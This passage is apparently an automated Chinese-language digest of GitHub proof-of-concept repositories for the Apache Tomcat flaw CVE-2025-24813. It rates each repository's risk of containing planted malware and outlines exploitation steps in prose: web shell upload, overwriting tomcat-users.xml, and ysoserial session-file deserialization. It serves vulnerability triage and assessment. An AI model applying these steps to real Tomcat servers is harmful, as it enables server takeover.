该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

